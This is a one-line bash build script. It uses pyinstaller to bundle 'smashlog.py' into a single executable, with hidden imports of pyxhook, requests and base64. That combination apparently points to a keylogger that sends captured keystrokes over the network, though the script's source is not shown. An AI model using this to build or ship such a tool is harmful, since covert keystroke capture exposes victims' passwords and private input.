#!/bin/bash

pyinstaller --onefile --hidden-import=pyxhook --hidden-import=requests --hidden-import=base64 smashlog.py
